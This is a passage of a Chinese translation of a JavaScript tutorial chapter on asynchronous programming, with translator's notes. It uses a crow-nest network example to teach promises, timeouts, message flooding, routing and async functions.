class="line">  .then(<span class="function"><span class="params">value</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">"Handler 2"</span>, value));</span><br><span class="line"><span class="comment">// → Caught failure Error: Fail</span></span><br><span class="line"><span class="comment">// → Handler 2 nothing</span></span><br></pre></td></tr></table></figure>

<p>就像未捕获的异常由环境处理一样，当一个promise rejection没有被处理时JS环境可以检测到并且将其作为错误报告。</p>
<h2 id="网络很难"><a href="#网络很难" class="headerlink" title="网络很难"></a>网络很难</h2><p>偶尔，对于乌鸦的镜像系统没有足够的光去传播一个信号或者有东西阻塞了信号传播。对于一个发出的信号但是永不会接收到是有可能的。</p>
<p>实际上，这将导致send的回调永远不会调用，这可能导致程序终止，而且我们甚至没有意识到存在问题。如果在给定时间过后还没有收到回应，请求超时并报告失败是不错的。</p>
<p>通常，传输失败是随机的意外，比如汽车的车头灯干扰了光信号，简单地重新尝试请求可能会成功。所以在此过程中，让我们的请求函数在它放弃之前重新发送请求多次。</p>
<p>既然我们已经认定promise是个好东西，我们也要让我们的请求函数返回一个promise。就它们可以表达的而言，回调和primise是等同的。基于回调的函数可以被包装来暴露一个基于promise的接口，反之亦然。</p>
<p>即使当一个请求和响应成功送达，响应也可能会失败，例如，如果请求还没有定义的类型或者处理程序抛出一个错误。为了支持这个，send和defineRequestType遵循之前提及的规范，传递给回调的第一个参数是失败的原因，第二个是实际的结果。</p>
<p>通过我们的包装器可以解释为promise的resolution和rejection。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 使超时容易被区分</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Timeout</span> <span class="keyword">extends</span> <span class="title">Error</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">request</span>(<span class="params">nest, target, type, content</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> done = <span class="literal">false</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">attempt</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">      <span class="comment">// send的回调如果在发送或者处理过程过程中产生error，那么通过failed可以检测到并将错误reject到链式调用的下一步</span></span><br><span class="line">      nest.send(target, type, content, (failed, value) =&gt; &#123;</span><br><span class="line">        done = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (failed) reject(failed);</span><br><span class="line">        <span class="keyword">else</span> resolve(value);</span><br><span class="line">      &#125;);</span><br><span class="line">      setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (done) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">3</span>) attempt(n + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">else</span> reject(<span class="keyword">new</span> Timeout(<span class="string">"Timed out"</span>));</span><br><span class="line">      &#125;, <span class="number">250</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    attempt(<span class="number">1</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>非原文翻译</strong>：这里额外做一下解释，以免将来忘记。我们这里的意图是想把<code>request</code>函数包装为promise形式。回调版本是基于对象调用，我们这里封装成一个函数，需要把源对象带上，也就是nest，这里作为新函数的第一个参数，而因为不需要callback，所以参数列表还是四个参数。然后我们调用request函数的时候，立刻执行promise构造器中的函数，首先初始化done为false来表示我们还未收到响应，随后调用attempt函数也就是开始尝试发送请求，这个通过nest对象的send方法实现，也是”crow-tech”包中提供的方法。这个方法的第四个参数是响应收到时的回调函数。我们调用send方法之后，由于它是异步方法，所以无需等待立刻执行setTimeout这也是一个异步函数，那么等待250毫秒之后，若我们在这个等待过程中已经收到响应了，那么就会先调用上面send方法的回调函数，就会将done设置为false。若这个等待时间过了，还没有执行刚刚的回调函数，说明响应因为某种原因没有收到，我们调用attempt并把参数值加1，使得三次attempt不成功之后就放弃并报出超时。这里还有一个地方没有说明，就是即便我们收到了响应，由于消息类型未知或者对于该消息的处理程序出现问题，我们也会失败，所以done设置为true之后，还要判断回调函数的第一个参数是不是被设置了，因为上面提到回调函数遵循的规范是第一个参数表明是否失败，而第二个参数才是回调返回的值。如果第一个参数被设置，说明在刚刚说的某个环节出现了问题，那么我们依然要reject，否则才是彻底的没问题，我们resolve结果即可。并一旦在attempt三次之内将done设置为true，我们下一次的执行的setTimeout就会return了。至此函数执行完毕。</p>
<p>因为promise只可以被resolve或者reject一次，这会工作。第一次resolve或者reject调用决定了promise的输出，任何下面的调用，比如在请求完成之后超时到达或者请求在另一次请求完成之后回来，都被忽略了。</p>
<p>为了构建一个异步的循环，对于重新尝试，我们需要一个递归函数，一个普通的循环不允许我们等待一个异步行为。attempt函数做单个attempt去发送一个请求。它也设置了一个超时，也就是说如果250毫秒过后没有响应，要么开始下一次尝试要么如果这是第四次尝试，就用Timeout的一个实例作为reason来reject promise。</p>
<p>每0.25秒重新请求并且1秒后没有响应就直接放弃当然有点武断。如果请求确实传送到了但是对于多次投递的请求处理程序多花费了点时间是可能的。我们将在编写处理程序的时候考虑这个问题——重复的消息应是无害的。</p>
<p>一般来说，我们今天不会构建一个世界级的，健壮的网络。但是那是ok的——乌鸦并没有太高的期望。</p>
<p>为了完全使我们隔离回调，我们继续，也要为<code>defineRequestType</code>定义一个包装器，使之允许处理函数返回一个promise或者普通的值，并将其和回调连接起来。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 将定义消息类型包装到一个基于promise的函数中</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">requestType</span>(<span class="params">name, handler</span>) </span>&#123;</span><br><span class="line">  defineRequestType(name, (nest, content, source, callback) =&gt; &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="built_in">Promise</span>.resolve(handler(nest, content, source)).then(<span class="function"><span class="params">response</span> =&gt;</span> callback(<span class="literal">null</span>, response), failure =&gt; callback(failure));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (exception) &#123;</span><br><span class="line">      callback(exception);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>非原文翻译：首先我们这个函数只是调用了defineRequestType这个函数，而在源代码实现中，这个函数只是将network实例的types属性上增加一个名为name的属性，其值为这里传入的handler。而它真正要被用到的是在后面的send函数中，我们在接收节点对数据的处理。而我们在这里传入的handler（接收三参数）并没有直接应用到对应的消息类型，而是将新函数内部的一个四参数的handler应用到该消息类型（每种消息类型都需要一个四参数的handler，最后一个参数包含回调），因为我们最终源代码里应用的是一个四参数的handler，那么我们调用者传入的handler要做什么呢？这个handler只接受三个参数，用于单纯的处理工作，而异步部分由promise完成。我们这里的Promise.resolve接收handler处理的结果，返回的值可能是JS原始值或者是promise值，而如果是原始值，那么就执行then的第一个参数，如果是promise值，就要根据resolve还是reject执行then的对应参数了。并且因为handler函数也可能抛出错误，这时then方法就帮不上什么忙了，需要catch其中的错误，并传递给回调函数。</strong></p>
<p><code>Promise.resolve</code>被用于将一个<code>handler</code>返回的值转换成promise（如果不是promise）。</p>
<p>注意对<code>handler</code>的调用被包装在<code>try</code>块中来保证任何抛出的异常直接给到回调函数。这很好地阐述了使用原始回调正确处理错误的困难——很容易忘记将异常像这样正确地路由，并且如果你不做这个，失败将不会报告到正确的回调。promise使得这个大多数都是自动的并且更不易出错。</p>
<h2 id="promise集合"><a href="#promise集合" class="headerlink" title="promise集合"></a>promise集合</h2><p>每一个巢穴计算机在他的<code>neighbors</code>属性中保存了传输距离内的其他巢穴的数组。为了检查哪些是当前可达的，你可以写一个函数尝试去发送”ping”请求到所有neighbor并观察哪些会有所响应。</p>
<p>当处理运行在同一时间的promise集合时，<code>Promise.all</code>函数是很有用的。它返回一个promise，这个promise等待数组中所有的promise去resolve，然后resolve到一个这些promise产生的值的数组（和原数组一样的顺序）。如果任何promise被reject了，那么<code>Promise.all</code>的结果本身也是reject。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义一种消息类型并指定其handler</span></span><br><span class="line"><span class="comment">// 接收到ping消息类型时，handler返回pong</span></span><br><span class="line">requestType(<span class="string">"ping"</span>, () =&gt; <span class="string">"pong"</span>);</span><br><span class="line"><span class="comment">// 这里我们要找到从某一巢穴可达的邻居集合，以数组形式体现</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">availableNeighbor</span>(<span class="params">nest</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> requests = nest.neighbors.map(<span class="function"><span class="params">neighbor</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> request(nest, neighbor, <span class="string">"ping"</span>)</span><br><span class="line">    .then(<span class="function"><span class="params">()</span> =&gt;</span> <span class="literal">true</span>, () =&gt; <span class="literal">false</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="comment">// requests是一个promise数组，并且promise状态都为resolved，只是值有的为true，有的为false</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Promise</span>.all(requests).then(<span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> nest.neighbors.filter(<span class="function">(<span class="params">_, i</span>) =&gt;</span> result[i])</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>非原文翻译</strong>：对上述代码进一步解释一下，首先nest.neighbors是响应巢穴的邻居数组，数组的map方法用于在数组上每个元素执行一个方法，并把得到的值替换到数组相应位置并返回这个新构造的数组。那么我们通过map方法构建了一个promise的数组，数组首先调用request函数，如果promise被resolve，那么我们调用then方法的第一个函数参数，否则调用then方法的第二个函数参数。结果就是产生了相应promise值为true或者false的promise对象，（<em>这里我查看了浏览器端promise对象包含的内容，发现promise对象由PromiseStatus和PromiseValue两部分组成，如图示</em>）这样我们获得了一个promise数组，并且对于不可达的也就是reject的位置我们将其promiseValue设置为false。这样是为了后面我们Promise.all方法不会fail，从而能成功调用then方法的第一个参数，所以我们利用filter的第二个参数是当前数组索引的事实，来成功筛选出那些promise含有值true的巢穴。</p>


<p>当一个neighbor不可得时，我们不想要整个组合的promise fail因为那样我们仍然不知道任何东西。所以映射到邻居集合的函数将他们转换为请求promise关联的处理程序成功的返回true，失败的返回false。</p>
<p>在组合的promise的处理函数中，filter被用于从邻居数组中移除那些对应值是false的元素。这利用了filter将当前元素的数组索引传递为第二个参数的事实（map,some和相似的高阶数组方法都是一样的）。</p>
<h2 id="网络洪泛"><a href="#网络洪泛" class="headerlink" title="网络洪泛"></a>网络洪泛</h2><p>巢穴只可以和他们邻居聊天的方式极大的抑制了网络的用途。</p>
<p>为了广播信息到整个网络，一个解决方案就是建立一种类型的请求来自动向邻居转发。这些邻居反过来在向它们的邻居转发，直到整个网络收到消息。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// everywhere是一个绑定到network实例执行的函数，对network的nodes对象的各个属性执行传入的函数</span></span><br><span class="line"><span class="keyword">import</span> &#123;everywhere&#125; <span class="keyword">from</span> <span class="string">"./crow-tech"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 为network中的nodes对象中的各节点对象调用该函数</span></span><br><span class="line"><span class="comment">// 每个节点对象含有一个state属性对象，我们为了避免重复发送gossip，需要记录一个接受过的gossip数组。</span></span><br><span class="line">everywhere(<span class="function"><span class="params">nest</span> =&gt;</span> &#123;</span><br><span class="line">  nest.state.gossip = [];</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从某一节点向除了exceptFor之外的其他邻居节点发送gossip</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sendGossip</span>(<span class="params">nest, message, exceptFor = null</span>) </span>&#123;</span><br><span class="line">  nest.state.gossip.push(message);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> neighbor <span class="keyword">of</span> nest.neighbors) &#123;</span><br><span class="line">    <span class="keyword">if</span>(neighbor == exceptFor) <span class="keyword">continue</span>;</span><br><span class="line">    request(nest, neighbor, <span class="string">"gossip"</span>, message)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 定义接收gossip时应该如何处理，注意这里传入的handler就是三参数的handler，不包含回调，因为我们在上面封装的函数中已经做处理了</span></span><br><span class="line">requestType(<span class="string">"gossip"</span>, (nest, message, source) =&gt; &#123;</span><br><span class="line">  <span class="comment">// 如果已经见过了该消息，那么就不再继续处理</span></span><br><span class="line">  <span class="keyword">if</span>(nest.state.gossip.includes(message)) <span class="keyword">return</span>;</span><br><span class="line">  <span class="comment">// 打印一段提示性信息</span></span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;nest.name&#125;</span> received gossip '<span class="subst">$&#123;message&#125;</span>' from <span class="subst">$&#123;source&#125;</span>`</span>);</span><br><span class="line">  <span class="comment">// 向除了源节点外的其他邻居节点发送gossip</span></span><br><span class="line">  sendGossip(nest, message, source);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>为了避免一直在网络中发送重复的消息，每一个巢穴保持它已经看见的gossip的字符串数组。为了定义这个数组，我们使用了<code>everywhere</code>函数——在每个巢穴上运行代码——对巢穴的state对象添加一个属性，在这个属性上我们保存巢穴局部的状态。</p>
<p>当一个巢穴收到一个重复的gossip消息，这个消息很有可能是别人盲目的重新发送过来的，它就会忽略他。但是当收到一个新消息的时候，它会将消息发送给除了发给它的那个源的其他所有邻居。</p>
<p>这将会使得一段gossip在网络中的传播犹如在水中墨水的扩散过程一样。即使有一些连接当前无效，如果有一个去给定巢穴的替代路由，这个gossip也会经由替代路由到达那里。</p>
<p>这种类型的网络通信叫做洪泛（flooding）——用一段信息洪范到整个网络直到所有节点接收到。</p>
<p>我们可以调用<code>sendGossip</code>来在整个村庄发送消息。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">sendGossip(bigOak, <span class="string">"Kids with airgun in the park"</span>);</span><br></pre></td></tr></table></figure>

<h2 id="消息路由"><a href="#消息路由" class="headerlink" title="消息路由"></a>消息路由</h2><p>如果一个给定节点想要和其他单个节点聊天，洪泛不是一个非常高效的方法。尤其当网络很大的时候，那将会导致大量无用信息的传输。</p>
<p>一个替代方案是开发一种新的方式让消息去从一个节点跳到另一个节点直到它们到达终点。这种方案的困难之处在于需要知道整个网络的结构。为了向遥远的巢穴发送一个请求，需要知道哪一个邻居巢穴可以转发这个消息到终点。发送到错误的方向不是太好。</p>
<p>因为每个巢穴都只知道直接相连的邻居，没有需要的信息去计算一个路由。我们必须以某种方式传播这些连接信息到所有的巢穴，最好是以一种可随时间动态变化的方式，比如当巢穴被遗弃或者新的巢穴被建筑。</p>
<p>我们可以再一次使用洪泛，但是不在检查消息是否已经收到过，而是检查给定巢穴的新的邻居集合是否匹配我们当前它的邻居集合。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义消息类型以及三参数的handler，注意这里的消息内容是一个含有两个属性的对象</span></span><br><span class="line">requestType(<span class="string">"connections"</span>, (nest, &#123;name, neighbors&#125;, source) &#123;</span><br><span class="line">  <span class="comment">// 和上面ping pong的函数类似，首先要获取到我们定义在state对象上的connections，为一个map，包含一个键值对，键为自己的name，值为neighbors数组</span></span><br><span class="line">  <span class="keyword">let</span> connections = nest.state.connections;</span><br><span class="line">  <span class="comment">// 接收到的neighbors若和之前name下记录的neighbors相同，则不做任何改动</span></span><br><span class="line">  <span class="comment">// 这里还有一个关于数组比较的小hack</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">JSON</span>.stringify(connections.get(name)) == <span class="built_in">JSON</span>.stringify(neighbors)) <span class="keyword">return</span>;</span><br><span class="line">  <span class="comment">// 说明有变动或者初次接收这个连接信息</span></span><br><span class="line">  <span class="comment">// 在自己的连接状态map中为这个name增加一个键值对</span></span><br><span class="line">  connections.set(name, neighbors);</span><br><span class="line">  <span class="comment">// 广播连接信息</span></span><br><span class="line">  broadcastConnections(nest, name, source);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">broadcastConnections</span>(<span class="params">nest, name, exceptFor = null</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 除了exceptFor指明的邻居，向其他邻居发送connection类型的消息，内容为一个包含该name以及对应name的neighbors数组的对象。</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> neighbor <span class="keyword">of</span> nest.neighbors) &#123;</span><br><span class="line">    <span class="keyword">if</span>(neighbor == exceptFor) <span class="keyword">continue</span>;</span><br><span class="line">    request(nest, neighbor, <span class="string">"connections"</span>, &#123;</span><br><span class="line">      name,</span><br><span class="line">      neighbors: nest.state.connections.get(name)</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对网络中的所有节点进行的操作</span></span><br><span class="line">everywhere(<span class="function"><span class="params">nest</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 在每个节点的state对象上新增一个connections属性，并将其初始化为一个map</span></span><br><span class="line">  nest.state.connections = <span class="keyword">new</span> <span class="built_in">Map</span>;</span><br><span class="line">  <span class="comment">// 在节点的connections map上新增本身的name和neighbors键值对</span></span><br><span class="line">  nest.state.connections.set(nest.name, nest.neighbors);</span><br><span class="line">  <span class="comment">// 从自己开始广播connections，由于每个节点从自身开始，这一步不包含exceptFor</span></span><br><span class="line">  broadcastConnections(nest, nest.name);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>比较使用了<code>JSON.stringify</code>由于==，在对象或者数组只在两个是一样的引用的时候才返回true，并不是我们在这里想要的结果。而比较JSON字符串是一种简单高效的比较内容的方法。</p>
<p>节点立刻开始广播它们的连接，除非有些巢穴完全不可达，否则很快就使得每个巢穴获得当前网络图的结构。</p>
<p>如同我们在第七章看到的一样，你可以用图来做的一件事就是在图中寻找路由。如果我们有一个朝着消息终点的路由，我们知道要把它发送到哪个方向。</p>
<p>这个<code>findRoute</code>函数，非常类似第七章的<code>findRoute</code>函数，寻找到达网络中一个给定节点的路径。但是代替返回整个路由，它仅仅返回下一跳。下一跳是用自己当前关于整个网络的信息得到的。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// BFS找路径</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">findRoute</span>(<span class="params">from, to, connections</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> work = [&#123;<span class="attr">at</span>: <span class="keyword">from</span>, <span class="attr">via</span>: <span class="literal">null</span>&#125;];</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; work.length; i++) &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123;at, via&#125; = work[i];</span><br><span class="line">    <span class="comment">// 如果不存在at的connections信息，用[],不加这个或会导致这种情况报错</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> next <span class="keyword">of</span> connections.get(at) || []) &#123;</span><br><span class="line">      <span class="comment">// 如果已经找到一个路径</span></span><br><span class="line">      <span class="keyword">if</span>(next == to) <span class="keyword">return</span> via;</span><br><span class="line">      <span class="comment">// 如果有一个邻居没有访问过，就加到向外生长的队列中</span></span><br><span class="line">      <span class="keyword">if</span>(!work.some(<span class="function"><span class="params">w</span> =&gt;</span> w.at == next)) &#123;</span><br><span class="line">        <span class="comment">// 初始情况via为null，所以这种情况下的via为next</span></span><br><span class="line">        work.push(&#123;<span class="attr">at</span>: next, <span class="attr">via</span>: via || next&#125;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在我们构建了一个可以发送长距离消息的函数。如果这个消息的终点是直接邻居，那么就正常投递。否则，被包装到一个对象中，并且发送到一个靠近终点的邻居，使用”route”请求类型，这个行为会导致邻居重复相同的行为。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 在看过前面几个代码例子后，我们发现就是我们每次增加需求的时候，都需要定义两个函数</span></span><br><span class="line"><span class="comment">// 一个就是定义消息类型的函数</span></span><br><span class="line"><span class="comment">// 另一个就是发送这种消息请求的函数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 发送一个路由请求</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">routeRequest</span>(<span class="params">nest, target, type, content</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 当要发送的终点节点是直接邻居时，正常发送request即可</span></span><br><span class="line">  <span class="keyword">if</span>(nest.neighbors.includes(target)) &#123;</span><br><span class="line">    <span class="keyword">return</span> request(nest, target, type, content);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 否则我们需要利用findRoute寻找下一跳</span></span><br><span class="line">    <span class="keyword">let</span> via = findRoute(nest.name, target, nest.state.connections);</span><br><span class="line">    <span class="comment">// 有可能找不到这样的路由，需要抛出错误</span></span><br><span class="line">    <span class="keyword">if</span>(!via) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">`No such route to <span class="subst">$&#123;target&#125;</span>`</span>);</span><br><span class="line">    <span class="comment">// 否则向下一跳发送包装过后的content。消息类型为route</span></span><br><span class="line">    <span class="keyword">return</span> request(nest, via, <span class="string">"route"</span>, &#123;target, type, content&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义route消息类型，直接调用routeRequest</span></span><br><span class="line">requestType(<span class="string">"route"</span>, (nest, &#123;target, type, content&#125;) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> routeRequest(nest, target, type, content);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>我们现在可以向church tower巢穴发送一个消息了，有四跳那么远。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">routeRequest(bigOak, <span class="string">"Church Tower"</span>, <span class="string">"note"</span>, <span class="string">"Incoming jackdaws!"</span>);</span><br></pre></td></tr></table></figure>

<p>我们已经在原始通讯系统上构建了几层的功能来使他更容易使用。这是一个很好（虽然简化了）的真实计算机网络工作模型。</p>
<p>计算机网络的不同的地方在于它们是不可依赖的——构建在它们上边的抽象并不能帮到什么忙，但是你不能将网络失败抽象走。所以网络编程通常是关于预测和处理失败。</p>
<h2 id="async函数"><a href="#async函数" class="headerlink" title="async函数"></a>async函数</h2><p>为了存储重要的信息，乌鸦们可以在巢穴间复制信息。以这种方式，就不怕老鹰过来破坏他们的巢穴而致使信息丢失了。</p>
<p>为了检索自己巢穴没有储存的信息，一个巢穴计算机不得不随机向网络中的其他巢穴寻求帮助直到它们找到一个拥有这个信息的巢穴。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 我们定义一个storage的消息类型，handler只需要name参数即可，第一个nest为接收方节点对象，然后返回调用storage函数的结果。</span></span><br><span class="line">requestType(<span class="string">"storage"</span>, (nest, name) =&gt; storage(nest, name));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 前面将storage封装为了promise版本，接收到返回结果后，执行then中的函数，如果当前节点找得到，那么直接返回，否则调用findRemoteStorage</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">findInStorage</span>(<span class="params">nest, name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> storage(nest, name).then(<span class="function"><span class="params">found</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (found != <span class="literal">null</span>) <span class="keyword">return</span> found;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> findInRemoteStorage(nest, name);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// connections是一个map对象，keys方法返回一个iterator，用Array.from可以将其包装为一个数组。</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">network</span>(<span class="params">nest</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Array</span>.from(nest.state.connections.keys());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">findInRemoteStorage</span>(<span class="params">nest, name</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 将connections对象中等于当前nest name的筛选掉，只剩下非当前nest的其他nest的connections信息</span></span><br><span class="line">  <span class="keyword">let</span> sources = network(nest).filter(<span class="function"><span class="params">n</span> =&gt;</span> n != nest.name);</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">next</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 如果全被筛选掉了，直接reject到findInStorage</span></span><br><span class="line">    <span class="keyword">if</span> (sources.length == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">Promise</span>.reject(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"Not found"</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// 随机选中一个source，将其筛选出去，留下其余</span></span><br><span class="line">      <span class="keyword">let</span> source = sources[<span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * sources.length)];</span><br><span class="line">      sources = sources.filter(<span class="function"><span class="params">n</span> =&gt;</span> n != source);</span><br><span class="line">      <span class="comment">// 从当前节点向随机出去的节点发送storage类型的消息，如果返回值为null，则继续调用next直到reject或者找到一个非nulll的值</span></span><br><span class="line">      <span class="keyword">return</span> routeRequest(nest, source, <span class="string">"storage"</span>, name).then(<span class="function"><span class="params">value</span> =&gt;</span> value != <span class="literal">null</span> ? value : next(), next);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> next();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为connections是一个map。Object.keys在map不能用。map有个keys方法，但是这返回一个itertor而不是一个数组。一个iterator（或者iterable）可以通过<code>Array.from</code>转换成数组。</p>
<p>即便是用promise这段代码也比较笨拙的。多个异步动作以一种不明显的方式链到一起。我们再一次需要一个递归函数（next）来为在这些巢穴间的循环建模。</p>
<p>代码实际上做的事完全线性的，他总是等待前面的行动完成才开始下一次行动。用一种同步的编程模型，这可能更容易去表达。</p>
<p>好消息是JS允许你书写伪同步代码去描述异步计算。<code>async</code>函数是隐式返回promise的函数，并且它可以在函数体内以一种看上去像同步的方式<code>await</code>其他promises。</p>
<p>我们可以像这样重写<code>findInStorage</code>函数。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">findInStorage</span>(<span class="params">nest, name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> local = <span class="keyword">await</span> storage(nest, name);</span><br><span class="line">  <span class="keyword">if</span> (local != <span class="literal">null</span>) <span class="keyword">return</span> local;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> sources = network(nest).filter(<span class="function"><span class="params">n</span> =&gt;</span> n != nest.name);</span><br><span class="line">  <span class="keyword">while</span> (sources.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> source = sources[<span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * sources.length)];</span><br><span class="line">    sources = sources.filter(<span class="function"><span class="params">n</span> =&gt;</span> n != source;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">let</span> found = <span class="keyword">await</span> routeRequest(nest, source, <span class="string">"storage"</span>, name);</span><br><span class="line">      <span class="keyword">if</span> (found != <span class="literal">null</span>) <span class="keyword">return</span> found;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (_) &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"Not found"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>async</code>函数通过在<code>function</code>关键字之前加一个<code>async</code>单词标记。方法也可以成为<code>async</code>的通过在它们的名字之前写一个<code>async</code>。当这样的函数或者方法调用时，它返回一个promise。函数体一返回什么的时候，这个promise就被resolve了。如果抛出异常，则promise被reject。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">findInStorage(bigOak, <span class="string">"events on 2017-12-21"</span>).then(<span class="built_in">console</span>.log);</span><br></pre></td></tr></table></figure>

<p>在一个<code>async</code>函数中，<code>await</code>单词可以放在一个表达式之前用来等待一个promise去resolve并且只有那样才继续执行函数。</p>
<p>这样的函数不再像一个普通的JS函数，从头运行到尾。法案二，他可以在任何有<code>await</code>的地方被冻结，并且可在之后继续执行。</p>
<p>对于重要的异步代码，这种改变通常比直接使用promise更方便。即使你需要做一些不遵循同步模型的事情，例如在同一时刻采取多个行动，组合<code>await</code>和promise的直接使用是很容易的。</p>
<h2 id="Generators"><a href="#Generators" class="headerlink" title="Generators"></a>Generators</h2><p>这种可以暂停并再次继续函数的能力不是<code>async</code>专有的。JS还有一个叫做<code>generator</code>函数的特性。它们是相似的，但是generator没有promise。</p>
